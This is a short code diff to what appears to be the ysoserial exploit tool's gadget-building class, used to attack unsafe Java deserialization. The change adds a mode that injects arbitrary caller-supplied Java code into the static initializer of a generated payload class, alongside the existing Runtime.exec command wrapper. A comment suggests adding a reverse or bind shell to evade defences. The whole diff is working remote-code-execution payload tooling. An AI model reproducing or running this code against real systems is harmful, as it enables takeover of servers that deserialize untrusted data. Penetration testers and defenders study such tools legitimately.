@@ -48,6 +48,9 @@ public class Gadgets {
 
         private static final long serialVersionUID = -5971610431559700674L;
 
+        public StubTransletPayload(){
+            namesArray = new String[]{"fuck"};
+        }
 
         public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
 
@@ -114,9 +117,14 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
+        String cmd;
+        if(command.startsWith("RCEECHO;")){
+            cmd = command.substring(8);
+        }else{
+            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replace("\\", "\\\\").replace("\"", "\\\"") +
+                "\");";
+        }
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
